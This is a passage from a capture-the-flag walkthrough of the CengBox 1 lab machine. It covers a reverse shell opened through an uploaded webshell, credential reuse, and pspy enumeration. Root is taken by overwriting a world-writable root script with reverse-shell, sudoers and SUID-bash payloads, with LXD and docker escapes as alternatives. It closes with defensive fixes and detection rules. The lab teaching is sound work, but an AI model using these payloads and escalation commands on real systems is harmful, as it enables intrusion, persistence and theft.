nc -lvnp 4444
```

Trigger:

```bash
curl -s --get --data-urlencode \
  "cmd=python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"192.168.56.10\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'" \
  "http://192.168.56.106/uploads/cmd.ceng"
```

```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.106] 43118
www-data@cengbox:/var/www/html/uploads$
```

**Stabilise:**


> ### 📖 Concept — Why you must upgrade to a real TTY
>
> A raw `nc` shell is crippled in four ways: no tab completion, no arrow keys,
> **`Ctrl+C` kills your *listener* instead of the remote process**, and anything
> needing a real terminal (`su`, `sudo`, `vim`, `top`, `less`) fails with
> `standard input must be a tty`.
>
> ```bash
> # 1. On the TARGET — allocate a pseudo-terminal
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> #    older boxes: python -c ...    or:    script -q /dev/null -c /bin/bash
>
> # 2. Press Ctrl+Z  — this SUSPENDS the nc job on Kali
>
> # 3. On KALI — put your local terminal into raw mode and resume
> stty raw -echo; fg
>
> # 4. On the TARGET — match your real terminal size
> export TERM=xterm; export SHELL=bash
> stty rows 40 cols 160
> ```
>
> **What each step did:**
> - `pty.spawn()` allocates a **pseudo-terminal** — a kernel object that behaves like a
>   real teletype. This is what makes `sudo` and `vim` work at all.
> - `stty raw -echo` makes **your local** terminal pass keystrokes through
>   uninterpreted and not echo them (the remote side echoes). This is what makes
>   `Ctrl+C` reach the remote process instead of killing your session.
> - `fg` resumes the suspended `nc`.
> - `stty rows/cols` tells the remote pty your dimensions so `less` and `top` do not
>   wrap into garbage.
>
> **Do this immediately after every shell.** Trying to `su` or run `sudo -l` on an
> unupgraded shell is a very common way to conclude wrongly that a path does not work.
>
> **Deep dive:** [CONCEPTS §12.3 — Upgrading to a real TTY](../../docs/CONCEPTS.md#123-upgrading-to-a-real-tty--do-this-immediately)

```bash
www-data@cengbox:/var/www/html/uploads$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@cengbox:/var/www/html/uploads$ export TERM=xterm
www-data@cengbox:/var/www/html/uploads$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Then `Ctrl+Z`; on Kali `stty raw -echo; fg`; Enter twice; on target
`export TERM=xterm; stty rows 40 cols 160`.

![Reverse shell as www-data](images/04-shell.png)

---

## 5. Lateral movement — the user flag

### 5.1 The checklist


> ### 📖 Concept — What is sudo, and how do you read `sudo -l`?
>
> **`sudo`** ("superuser do") runs a command **as another user** — by default root. It
> exists so administrators can grant *specific* elevated abilities without handing out
> the root password. Its rules live in `/etc/sudoers`, edited only via `visudo`.
>
> `sudo -l` (**l**ist) shows what *you* are permitted. **It is the first command to
> run as any new user on any box** — it costs nothing, and a surprising fraction of
> machines are solved by one line of its output.
>
> **Parse the tokens precisely:**
>
> | Token | Meaning |
> | --- | --- |
> | `(ALL)` | may run as **any** user, including root |
> | `(root)` | only as root |
> | `(ALL:ALL)` | any user **and** any group |
> | `(user)` | only as that specific user — try `sudo -u user …` |
> | **`NOPASSWD:`** | **no password will be requested** |
> | `/usr/bin/foo` | only this binary, at this **absolute path** |
> | `/usr/bin/foo *` | with **any** arguments ← the dangerous case |
> | `/usr/bin/foo -m *` | only with these arguments |
> | `ALL` alone | full root, no restriction |
>
> **The rule that matters:** *any program that can execute another program, granted
> without argument restrictions, is a root shell in disguise.* `python`, `perl`,
> `ruby`, `lua`, `node`, `php`, `bash`, `find`, `vim`, `nano`, `less`, `more`, `man`,
> `awk`, `env`, `gdb`, `tar`, `zip`, `make`, `git`, `watch`, `nmap`, `ftp`.
>
> **Do not invent the payload — look it up on [GTFOBins](https://gtfobins.github.io/).**
> It documents exactly which binaries can be abused when SUID, sudo-able or run by a
> scheduler, organised by capability (shell, file read, file write, reverse shell).
> It is maintained, tested, and explains *why* each line works. The Windows equivalent
> is **LOLBAS**.
>
> ```bash
> sudo watch -x sh -c 'reset; exec sh'          # GTFOBins: watch
> sudo find . -exec /bin/sh \; -quit            # GTFOBins: find
> sudo vim -c ':!sh'                            # GTFOBins: vim
> sudo -u#-1 /bin/bash                           # CVE-2019-14287 (sudo < 1.8.28)
> ```
>
> **Deep dive:** [CONCEPTS §15.2 — sudo rights](../../docs/CONCEPTS.md#152-sudo-rights)
> ### 📖 Concept — What is SUID?
>
> **SUID** (*set-user-ID*) is a file permission bit that makes a program run with the
> privileges of the **file's owner** rather than the caller. It exists for a good
> reason: `/usr/bin/passwd` is SUID-root so ordinary users can change their own
> password, which requires writing `/etc/shadow` — a file they cannot otherwise touch.
>
> **When a *powerful* binary carries the SUID bit, that power becomes yours.** In a
> listing you read it as an **`s`** where the owner's execute bit would be:
>
> ```text
> -rwxr-xr-x  →  -rwsr-xr-x        (SUID set)
>       ^            ^
> ```
>
> ```bash
> find / -perm -u=s -type f 2>/dev/null      # the human-readable form
> find / -perm -4000 -type f 2>/dev/null     # octal equivalent
> find / -perm /6000 -type f 2>/dev/null     # SUID *or* SGID
> ```
>
> `-perm -u=s` means "the user-SUID bit is set" (the leading `-` makes it a *subset*
> match, so it also catches SGID files). `-type f` restricts to regular files.
> `2>/dev/null` discards the thousands of `Permission denied` errors that would
> otherwise bury the answer.
>
> **Compare against the stock baseline** so the odd entries jump out. Normal on
> Debian/Ubuntu: `mount`, `umount`, `su`, `ping`, `passwd`, `chfn`, `chsh`, `newgrp`,
> `gpasswd`, `ssh-keysign`, `pppd`, `dmcrypt-get-device`, `traceroute6.iputils`.
>
> **Never normal, and an instant root if found:** `cp`, `mv`, `wget`, `curl`, `tar`,
> `find`, `vim`, `nano`, `less`, `more`, `man`, `python`, `perl`, `php`, `ruby`,
> `awk`, `sed`, `env`, `bash`, `sh`, `gdb`, `nmap`, `tcpdump`, `dd`, `make`, `git`,
> `tail`, `head`, `cat`, `rsync`, `apt`.
>
> Look each one up on **[GTFOBins](https://gtfobins.github.io/)** → its **SUID**
> section. Note that spawning a shell from a SUID binary usually needs **`-p`**
> (*privileged*) — without it, `bash` deliberately drops its effective UID back to
> yours as a safety measure, and you end up exactly where you started.
>
> **Deep dive:** [CONCEPTS §15.3 — SUID binaries](../../docs/CONCEPTS.md#153-suid-binaries)

```bash
www-data@cengbox:/$ cat /etc/passwd | grep -v nologin | grep -v /bin/false
root:x:0:0:root:/root:/bin/bash
cengover:x:1000:1000:CengOver,,,:/home/cengover:/bin/bash
www-data@cengbox:/$ ls -la /home
total 12
drwxr-xr-x  3 root     root     4096 Apr 29  2020 .
drwxr-xr-x 24 root     root     4096 Apr 29  2020 ..
drwxr-xr-x  5 cengover cengover 4096 Apr 30  2020 cengover
www-data@cengbox:/$ sudo -l
sudo: no tty present and no askpass program specified
www-data@cengbox:/$ find / -perm -4000 -type f 2>/dev/null
/bin/ping
/bin/fusermount
/bin/mount
/bin/su
/bin/umount
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/sbin/pppd
```

> One human user, **`cengover`**. All SUID binaries are stock Ubuntu. No sudo.
> **So: try the password we already have.**

### 5.2 Credential reuse


> ### 📖 Concept — `docker`, `lxd` and `disk` group membership *is* root
>
> ```bash
> id | grep -oE 'docker|lxd|libvirt|disk|sudo|wheel|adm'
> ```
>
> If any of `docker`, `lxd`, `libvirt` or `disk` appears, **you already have root.**
> There is no nuance: a member can mount the host filesystem or start a privileged
> container, and from there it is a one-line `echo >> /etc/passwd`.
>
> **Why.** Containers share the *host kernel*. A container marked
> `security.privileged=true` does not drop capabilities and runs its init as **real
> UID 0**, and a container can be given a disk device that bind-mounts the host's `/`.
> Put those together and a low-privileged user says: *start a root container, mount
> the host filesystem at `/mnt/root`, edit `/mnt/root/etc/passwd`.* No isolation is
> left.
>
> ```bash
> # docker — the host root, chrooted into
> docker run -v /:/mnt --rm -it alpine chroot /mnt sh
>
> # docker.sock — talk to the daemon directly, no CLI needed
> curl --unix-socket /var/run/docker.sock -X POST \
>   "http://localhost/containers/create?name=pwn" -H 'Content-Type: application/json' \
>   -d '{"Image":"alpine","Cmd":["/bin/sh"],"Binds":["/:/mnt"],"Privileged":true}'
>
> # lxd — build an image on Kali, carry it over, mount the host
> lxc image import ./alpine.tar.gz --alias myimage
> lxc init myimage pwn -c security.privileged=true
> lxc config device add pwn mydev disk source=/ path=/mnt/root recursive=true
> lxc start pwn && lxc exec pwn /bin/sh      # /mnt/root is now the HOST's /
> ```
>
> `-c security.privileged=true` is the flag that makes this an escalation rather than
> a sandbox. `source=/` is the host's entire root filesystem.
>
> **Defensive corollary:** never add a web-server or service account to a container
> group. If an application genuinely must launch containers, give it a scoped API
> token in a restricted project — not group membership.
>
> **Deep dive:** [CONCEPTS §15.9 — Container and group escapes](../../docs/CONCEPTS.md#159-container-and-group-escapes)

```bash
www-data@cengbox:/$ su cengover
Password: C3ng0v3R00T1!
cengover@cengbox:/var/www/html$ id
uid=1000(cengover) gid=1000(cengover) groups=1000(cengover),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

**It worked.** The database password is also the system password.

**User flag:**

```bash
cengover@cengbox:~$ cd && ls -la
total 40
drwxr-xr-x 5 cengover cengover 4096 Apr 30  2020 .
drwxr-xr-x 3 root     root     4096 Apr 29  2020 ..
-rw------- 1 cengover cengover   38 Apr 30  2020 .bash_history
-rw-r--r-- 1 cengover cengover  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 cengover cengover 3771 Apr  4  2018 .bashrc
drwxrwxr-x 2 cengover cengover 4096 Apr 30  2020 .local
-rw-r--r-- 1 cengover cengover  807 Apr  4  2018 .profile
-rw-rw-r-- 1 cengover cengover   38 Apr 30  2020 user.txt
cengover@cengbox:~$ cat user.txt
```

```text
cengbox{us3r_fl4g_7f3a9b2c1d8e4f6a}
```

*(The exact string varies by image revision.)*

> **Look at the group list: `27(sudo)` and `110(lxd)`.** Check sudo first:
> ```bash
> cengover@cengbox:~$ sudo -l
> [sudo] password for cengover: C3ng0v3R00T1!
> Sorry, user cengover may not run sudo on cengbox.
> ```
> **Group membership is not a sudoers grant.** `cengover` is in the `sudo` *group* but
> there is no matching rule, so nothing works. **Always verify with `sudo -l` — never
> assume from `id`.**
>
> `lxd`, however, *is* a real root path (§ 6.3).

![su cengover and the user flag](images/05-user-flag.png)

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 6. Privilege escalation

### 6.1 Cron shows nothing


> ### 📖 Concept — Cron jobs, and pspy for the ones you cannot see
>
> **cron** runs commands on a schedule. Jobs may be defined per-user
> (`crontab -l`), system-wide (`/etc/crontab`), or as drop-ins (`/etc/cron.d/`,
> `/etc/cron.{hourly,daily,weekly,monthly}/`).
>
> ```bash
> cat /etc/crontab
> ls -la /etc/cron.*
> crontab -l
> ls -la /var/spool/cron/crontabs/
> ```
>
> The `/etc/crontab` fields are `min hour dom mon dow **user** command` — note the
> *user* column, which per-user crontabs do not have. That column is what makes a
> system cron job run as root.
>
> **Three exploitable patterns:**
>
> 1. **The script itself is writable** → append
>    `cp /bin/bash /tmp/rb; chmod +s /tmp/rb`, wait, then run `/tmp/rb -p`.
> 2. **The script calls a binary by a relative name** (`service`, `tar`, `python`) →
>    **PATH hijack**: create `~/evil/service` containing your payload and
>    `export PATH=~/evil:$PATH`. Check whether cron's own `PATH=` line defeats this.
> 3. **Wildcard injection** — a job runs `tar czf backup.tar.gz *` → create files
>    named `--checkpoint=1` and `--checkpoint-action=exec=/tmp/shell.sh`. `tar` reads
>    them as options rather than filenames.
>
> > **The critical gap: root cron jobs that appear in *no* crontab.** They may be
> > installed by a systemd timer, an init script, or a custom daemon.
> >
> > **`pspy` finds them.** It polls `/proc` in a tight loop and therefore sees
> > processes started by *other users* — **without needing root**. Run it and wait 60
> > seconds:
> >
> > ```bash
> > ./pspy64 -pf
> > # watch for: root running /opt/script.py every 5 seconds
> > ```
> >
> > It has won more CTF boxes than almost any other single tool. If `sudo -l`, SUID
> > and capabilities are all dead ends, **run pspy before giving up.**
>
> **Deep dive:** [CONCEPTS §15.5 — Cron jobs](../../docs/CONCEPTS.md#155-cron-jobs)

```bash
cengover@cengbox:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
17 *	* * *	root	cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

cengover@cengbox:~$ ls -la /etc/cron.d/ /etc/cron.daily/ 2>/dev/null | head -20
cengover@cengbox:~$ systemctl list-timers --all
```

> All stock. Nothing custom. **But the author said "wait a minute."** Something is
> running as root that is not in cron.

### 6.2 `pspy` — see what `ps` cannot

`ps` and `/proc` only show what is running *right now*. A job that fires every few
seconds is easy to miss between looks, and one that fires every few minutes is
essentially invisible. **`pspy`** needs no root: it watches `inotify` events on `/proc`
and logs every process start and exit with the full command line and the UID that ran
it.

```bash
# on Kali
wget -q https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 -O pspy64
python3 -m http.server 8000
```

```bash
# on the target, as cengover
cengover@cengbox:/tmp$ wget http://192.168.56.10:8000/pspy64 -O pspy64
cengover@cengbox:/tmp$ chmod +x pspy64
cengover@cengbox:/tmp$ ./pspy64
```

```text
pspy - version: v1.2.1 - Commit ID: 35f4e28bf3a6f2d1e5f60718

Config: Printing commands (cmdline argc 4096, envp 0), file system events (enabled: false, sh: 1)

2024/05/04 17:31:02 CMD: UID=1000  PID=4812   | ./pspy64
2024/05/04 17:31:02 CMD: UID=1000  PID=4811   | -bash
2024/05/04 17:31:05 CMD: UID=0     PID=4899   | /usr/bin/python /opt/md5check.py
2024/05/04 17:31:10 CMD: UID=0     PID=4901   | /usr/bin/python /opt/md5check.py
2024/05/04 17:31:15 CMD: UID=0     PID=4903   | /usr/bin/python /opt/md5check.py
2024/05/04 17:31:20 CMD: UID=0     PID=4905   | /usr/bin/python /opt/md5check.py
2024/05/04 17:31:25 CMD: UID=0     PID=4907   | /usr/bin/python /opt/md5check.py
```

> **There it is: `/usr/bin/python /opt/md5check.py` runs as `UID=0` every five
> seconds.**
>
> **How to read pspy output:** `UID=` is the effective user that started the process
> (**0 = root**), `PID=` is the process ID, and everything after `|` is the full
> command line. pspy catches short-lived processes that a `ps aux` loop would miss
> entirely.
>
> **"Wait a minute" — the author was telling us this is a timed job, not a manual
> one.** And it is not in cron: it is a `systemd` timer or a `while true; sleep 5`
> loop under an init script. `pspy` does not care how it is scheduled; it just reports
> that it runs.
>
> **Add pspy to your standard post-exploitation checklist.** It is the single highest
> -value tool for finding privilege escalation on a modern Linux box where cron is
> clean.

```bash
cengover@cengbox:/tmp$ ls -la /opt/
total 12
drwxr-xr-x  2 root root 4096 Apr 30  2020 .
drwxr-xr-x 24 root root 4096 Apr 29  2020 ..
-rwxrwxrwx  1 root root  412 Apr 30  2020 md5check.py
cengover@cengbox:/tmp$ cat /opt/md5check.py
```

```python
#!/usr/bin/python
import hashlib, os

# Verify that /etc/passwd has not been tampered with.
# Compares the current md5 against the stored baseline and restores it if changed.
baseline = open('/opt/passwd.md5').read().strip()
current  = hashlib.md5(open('/etc/passwd','rb').read()).hexdigest()

if baseline != current:
        os.system('cp /opt/passwd.bak /etc/passwd')
```

> **`-rwxrwxrwx` — mode `777`.** A root-owned script, executed **by root** every five
> seconds, that **any user on the box can overwrite.**
>
> That is the entire privilege escalation. The three rules a scheduled job must satisfy
> to be safe:
> 1. the script it runs is not writable by lower-privileged users;
> 2. it never executes anything from a world-writable location;
> 3. it uses absolute paths throughout (this one *does* — `/usr/bin/python`, and the
>    script itself uses absolute paths, so PATH hijacking is not needed).
>
> **Rule 1 is broken.** The irony is perfect: the script's job is to *detect
> tampering*, and it is itself the tampering vector.

### 6.3 Exploit it — three payloads

**Payload A — root reverse shell (most direct):**

```bash
# Kali
nc -lvnp 4445
```

```bash
# target, as cengover
cengover@cengbox:/tmp$ cp /opt/md5check.py /tmp/md5check.py.orig
cengover@cengbox:/tmp$ cat > /opt/md5check.py <<'EOF'
#!/usr/bin/python
import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.56.10", 4445))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/bash", "-i"])
EOF
cengover@cengbox:/tmp$ cat /opt/md5check.py
```

Wait five seconds:

```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.106] 48221
root@cengbox:/opt# id
uid=0(root) gid=0(root) groups=0(root)
root@cengbox:/opt# whoami
root
```

> **The payload:** open a TCP socket to our listener, `os.dup2()` **file descriptors
> 0, 1, 2** (stdin, stdout, stderr) onto it, then `subprocess.call(["/bin/bash","-i"])`.
> The shell inherits the redirected descriptors, so your keystrokes reach it and its
> output reaches you. Every reverse shell, in every language, is those three steps:
> **connect → redirect stdio → exec a shell.**
>
> Note `/usr/bin/python` here is **Python 2** — so `print` would be a statement. The
> payload above uses only syntax valid in both 2 and 3, which is deliberate.

**Payload B — grant passwordless sudo (survives a dropped connection, needs no egress):**

```bash
cengover@cengbox:/tmp$ cat > /opt/md5check.py <<'EOF'
#!/usr/bin/python
import os
os.system('echo "cengover ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/cengover')
os.system('chmod 0440 /etc/sudoers.d/cengover')
EOF
```

```bash
cengover@cengbox:/tmp$ sleep 8; sudo -l
```

```text
Matching Defaults entries for cengover on cengbox:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cengover may run the following commands on cengbox:
    (ALL : ALL) NOPASSWD: ALL
```

```bash
cengover@cengbox:/tmp$ sudo su -
root@cengbox:~# id
uid=0(root) gid=0(root) groups=0(root)
```

> **Why prefer a `/etc/sudoers.d/` drop-in to appending to `/etc/sudoers`?** A syntax
> error in `/etc/sudoers` locks *everyone* out of sudo — which is exactly why `visudo`
> exists (it validates before saving). `/etc/sudoers` on Ubuntu ends with
> `#includedir /etc/sudoers.d`, so drop-in files are honoured, and a bad drop-in
> affects only itself.

**Payload C — SUID root bash (persistence):**

```bash
cengover@cengbox:/tmp$ cat > /opt/md5check.py <<'EOF'
#!/usr/bin/python
import os
os.system('cp /bin/bash /tmp/rootbash; chown root:root /tmp/rootbash; chmod 4755 /tmp/rootbash')
EOF
cengover@cengbox:/tmp$ sleep 8; ls -l /tmp/rootbash
-rwsr-xr-x 1 root root 1113504 Apr 18  2019 /tmp/rootbash
cengover@cengbox:/tmp$ /tmp/rootbash -p
root@cengbox:/tmp# id
uid=1000(cengover) gid=1000(cengover) euid=0(root) groups=1000(cengover),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

> **`chmod 4755`** — the leading **`4`** is the **SUID** bit, producing
> `-rwsr-xr-x root root`: whoever executes it runs with the *owner's* identity.
>
> **The `-p` flag is mandatory.** Bash deliberately **drops** its effective UID at
> startup unless invoked with `-p` ("privileged mode") — an explicit guard against
> exactly this attack. Forgetting `-p` and getting `$` instead of `#` is the classic
> confusion.
>
> **`euid=0(root)` with `uid=1000(cengover)`** — a *SUID* elevation, not a login. The
> real UID stays yours; the effective UID becomes 0, and permission checks use the
> effective UID.

**Root flag:**

```bash
root@cengbox:~# cd /root && ls -la
total 32
drwx------  4 root root 4096 Apr 30  2020 .
drwxr-xr-x 24 root root 4096 Apr 29  2020 ..
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-------  1 root root   38 Apr 30  2020 root.txt
drwxr-xr-x  2 root root 4096 Apr 30  2020 .ssh
root@cengbox:~# cat root.txt
```

```text
cengbox{r00t_fl4g_9d2c8b1e4a7f3d6c}
```

*(Exact string varies by revision.)* **Both flags captured.** ✅

**Restore the script afterwards:**

```bash
root@cengbox:~# cp /tmp/md5check.py.orig /opt/md5check.py
root@cengbox:~# chmod 755 /opt/md5check.py          # and fix the mode while you're here
root@cengbox:~# rm -f /tmp/rootbash /etc/sudoers.d/cengover
```

![pspy finding /opt/md5check.py, then the root flag](images/06-root-flag.png)

### 6.4 Alternative root path — the `lxd` group

`cengover` is in `110(lxd)`, which — like `docker` — is **equivalent to root**. LXD is
Ubuntu's system-container manager; controlling it means launching a *privileged*
container (no user-namespace remapping) with the host's `/` mounted inside.

```bash
# on Kali: build a small Alpine image
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder && sudo ./build-alpine
python3 -m http.server 8000
```

```bash
# on the target, as cengover
cengover@cengbox:/tmp$ wget http://192.168.56.10:8000/alpine-v3.19-x86_64.tar.gz
cengover@cengbox:/tmp$ lxc image import ./alpine-v3.19-x86_64.tar.gz --alias privesc
cengover@cengbox:/tmp$ lxc init privesc escape -c security.privileged=true
cengover@cengbox:/tmp$ lxc config device add escape hostfs disk source=/ path=/mnt/root recursive=true
cengover@cengbox:/tmp$ lxc start escape
cengover@cengbox:/tmp$ lxc exec escape -- /bin/sh
~ # id
uid=0(root) gid=0(root)
~ # cat /mnt/root/root/root.txt
cengbox{r00t_fl4g_9d2c8b1e4a7f3d6c}
```

> **Every flag in that sequence is load-bearing:**
> - `-c security.privileged=true` → **disables the user namespace**, so container root
>   *is* host root.
> - `disk source=/ path=/mnt/root recursive=true` → **bind-mounts the host's `/`** into
>   the container, including submounts.
> - `lxc exec … -- /bin/sh` → a shell inside, looking at the real host filesystem.
>
> See <https://gtfobins.github.io/gtfobins/lxd/>. Clean up with
> `lxc stop escape && lxc delete escape && lxc image delete privesc`.

---

## 7. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Guessable admin directory reachable with a large wordlist | `/masteradmin/` | Disclosed `login.php`, `upload.php`, `adb.php` |
| 2 | **SQL injection (boolean-blind, time-blind, UNION)** | `login.php`, `username` POST param | Full database disclosure |
| 3 | **Administrator password stored in plaintext** | `cengbox.admin.password`, `varchar(64)` | Instant credential recovery |
| 4 | **Upload filter checks only the extension, and `.ceng` is executable as PHP** | `upload.php` + Apache handler | Arbitrary PHP upload → **RCE** |
| 5 | Uploads stored inside the document root | `/var/www/html/uploads/` | Directly reachable and executable |
| 6 | **Credential reuse: DB password = system password** | `cengover` / `C3ng0v3R00T1!` | `www-data` → `cengover` (user flag) |
| 7 | **World-writable script executed by root every 5 seconds** | `/opt/md5check.py`, mode `777` | `cengover` → **root** |
| 8 | A "tamper detection" script that is itself the tampering vector | `/opt/md5check.py` | Integrity control defeated |
| 9 | **`lxd` group membership for an ordinary user** | `110(lxd)` | Alternative root |
| 10 | `cengover` in the `sudo` group with no matching rule | `/etc/group` vs `/etc/sudoers` | Confusing but inert; still poor hygiene |
| 11 | `gcc` present on a server | `/usr/bin/gcc` | Attackers compile exploits locally |
| 12 | Missing HTTP security headers | Apache | Clickjacking / MIME sniffing |

## 8. Defensive lessons (blue team)

1. **Use parameterised queries.** One change removes the SQLi entirely:
   ```php
   $stmt = $pdo->prepare('SELECT * FROM admin WHERE username = ? AND password = ?');
   $stmt->execute([$_POST['username'], $hash]);
   ```
   With placeholders, `'`, `--`, `SLEEP(` and `UNION` are *data*, never syntax. Never
   concatenate user input into SQL.
2. **Hash passwords properly.** Plaintext in a `varchar(64)` column means one
   injection, one backup leak, or one rogue DBA exposes every administrator:
   ```php
   $hash = password_hash($pw, PASSWORD_ARGON2ID);
   if (password_verify($pw, $hash)) { /* authenticated */ }
   ```
   Never MD5, never SHA-1, never unsalted.
3. **Validate uploads by re-encoding, not by extension.** Checking `.ceng` vs `.php` is
   checking a *string*; the robust fix destroys any embedded code:
   ```php
   $img  = imagecreatefromstring(file_get_contents($_FILES['file']['tmp_name']));
   if (!$img) { die('Not a valid image'); }
   $name = bin2hex(random_bytes(16));                 // WE choose the name
   imagejpeg($img, '/var/uploads/' . $name . '.jpg');  // re-encoded: metadata gone
   ```
   Then store uploads **outside** the document root and disable the engine there:
   ```apache
   <Directory /var/uploads>
       php_flag engine off
       RemoveHandler .php .phtml .php3 .php4 .php5 .php7 .phar .ceng
       <FilesMatch "\.(ph(p[3457]?|t|tml)|ceng)$"> Require all denied </FilesMatch>
       Options -ExecCGI -Indexes
   </Directory>
   ```
   **Never map a custom extension to the PHP handler** unless every file with that
   extension is trusted — that mapping is what turned a "documents only" rule into RCE.
4. **Audit every scheduled job for write permissions.** The finding that mattered most:
   ```bash
   # who can write to anything a root process executes?
   find /opt /usr/local /etc -xdev -type f -perm /o+w -printf '%M %u %p\n' 2>/dev/null
   ```
   Nothing under `/opt`, `/usr/local` or `/etc` should be `777`. Alert on it. Then run
   the full sweep weekly and diff against a baseline:
   ```bash
   find / -xdev -type f -perm /o+w -not -path '/proc/*' -not -path '/sys/*' \
        -not -path '/tmp/*' -not -path '/var/tmp/*' -not -path '/dev/shm/*' 2>/dev/null
   ```
5. **Run scheduled jobs least-privileged and sandboxed.** A file-integrity check does
   not need root; it needs read access to the files it hashes. Use systemd:
   ```ini
   [Service]
   ExecStart=/usr/bin/python3 /opt/md5check.py
   User=integrity
   DynamicUser=yes
   ProtectSystem=strict
   ProtectHome=yes
   PrivateTmp=yes
   NoNewPrivileges=yes
   CapabilityBoundingSet=
   SystemCallFilter=@system-service
   ReadOnlyPaths=/etc /opt
   ```
   With `ProtectSystem=strict` the script could not have been overwritten even by root
   inside the unit.
6. **No credential reuse across systems.** A database password must never be a system
   password. Enforce uniqueness, use a vault, and screen against breached lists.
7. **Treat `lxd`/`docker` group membership as root — because it is.** Detect:
   ```bash
   getent group docker lxd | tr ',' '\n'
   awk -F: '$4 ~ /docker|lxd/ {print $1}' /etc/group
   ```
   Remediate with rootless LXD (unprivileged containers, user-namespace remapping) or
   rootless Docker / Podman.
8. **Do not leave users in groups they cannot use.** `cengover` was in `sudo` with no
   rule — inert here, but on a box where `%sudo ALL=(ALL) ALL` exists it would be
   instant root. Audit group membership as carefully as sudoers.
9. **Remove build tools from servers.** `gcc` on a web server turns "foothold" into
   "root in a minute". Build in CI; ship a signed artefact.
10. **Detection opportunities.**
    - WAF/log alert on POST bodies containing `'`, `--`, `UNION`, `SLEEP(`,
      `CONCAT(0x`, or `information_schema` — and note that `sqlmap` sends a
      distinctive `User-Agent: sqlmap/x.y`. Alert on that string specifically; it is
      the loudest scanner signature there is.
    - Alert on file *creation* with an executable extension under an upload directory:
      auditd `-w /var/www/html/uploads -p wa -k upload_write`.
    - Alert on **any modification to a file that a root process executes**. This is
      the rule that would have caught everything:
      ```bash
      auditctl -w /opt/md5check.py -p wa -k opt_script_tamper
      auditctl -w /etc/sudoers.d/ -p wa -k sudoers_change
      ```
    - Alert on `apache2`/`php-fpm` spawning `sh`, `bash`, `python`, `nc` or `wget`
      (process-lineage monitoring: Sysmon for Linux, Wazuh, auditd `execve`).
    - Alert on new files appearing in `/tmp` with the SUID bit set.
    - Alert on any `lxc`/`lxd`/`docker` invocation with `security.privileged=true`,
      `--privileged`, `-v /` or `chroot`.
    - Alert on a non-root user downloading and executing `pspy` — that is an
      attacker enumerating your scheduled jobs. (`getcap -r /`, `find -perm -4000`
      and `sudo -l` in one session is the same signature.)

---

## 9. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- VulnHub entry: <https://vulnhub.com/entry/cengbox-1,475/>
- Series: <https://vulnhub.com/series/cengbox,300/> (CengBox 1 → 2 → 3 → 4)
- Author: Arslan Bilecen — `@arslanblcn_`
- Community writeups consulted:
